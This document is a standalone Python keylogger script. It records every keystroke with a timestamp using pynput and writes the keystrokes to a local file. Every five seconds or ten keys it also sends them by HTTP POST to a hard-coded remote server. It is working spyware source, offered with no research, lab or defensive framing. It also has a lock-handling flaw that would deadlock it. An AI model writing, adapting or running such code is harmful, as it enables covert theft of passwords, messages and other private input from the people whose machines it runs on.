import datetime
import requests
from pynput import keyboard
import threading
import time

# Configuration
log_file_path = "keystroke_log.txt"
server_url = "http://10.7.241.179:8080/receive_keystrokes"
buffer_size = 10  # Send buffer when it reaches this size
send_interval = 5  # Seconds, send buffer at this interval if not full

class KeyLogger:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()
        self.sender_thread = threading.Thread(target=self.periodic_send)
        self.sender_thread.daemon = True  # So it stops when main thread stops
        self.sender_thread.start()

    def on_press(self, key):
        try:
            keystroke_data = f"{datetime.datetime.now()} - {key.char}\n"
        except AttributeError:
            keystroke_data = f"{datetime.datetime.now()} - {key}\n"
        
        with self.lock:
            self.buffer.append(keystroke_data)
            if len(self.buffer) >= buffer_size:
                self.flush_buffer()

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener on Esc key press
            return False

    def send_data_to_server(self, data):
        try:
            headers = {'Content-Type': 'text/plain'}
            response = requests.post(server_url, headers=headers, data=data)
            if response.status_code != 200:
                print(f"Failed to send data. Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending data: {e}")

    def flush_buffer(self):
        with self.lock:
            buffer_copy = ''.join(self.buffer)
            self.buffer.clear()
            threading.Thread(target=self.send_data_to_server, args=(buffer_copy,)).start()
            # Optionally, log to file in a separate thread to avoid blocking
            threading.Thread(target=self.log_to_file, args=(buffer_copy,)).start()

    def log_to_file(self, data):
        with open(log_file_path, "a") as log_file:
            log_file.write(data)

    def periodic_send(self):
        while True:
            time.sleep(send_interval)
            with self.lock:
                if self.buffer:
                    buffer_copy = ''.join(self.buffer)
                    self.buffer.clear()
                    threading.Thread(target=self.send_data_to_server, args=(buffer_copy,)).start()
                    threading.Thread(target=self.log_to_file, args=(buffer_copy,)).start()

# Collect events until released
key_logger = KeyLogger()
with keyboard.Listener(on_press=key_logger.on_press, on_release=key_logger.on_release) as listener:
    listener.join()
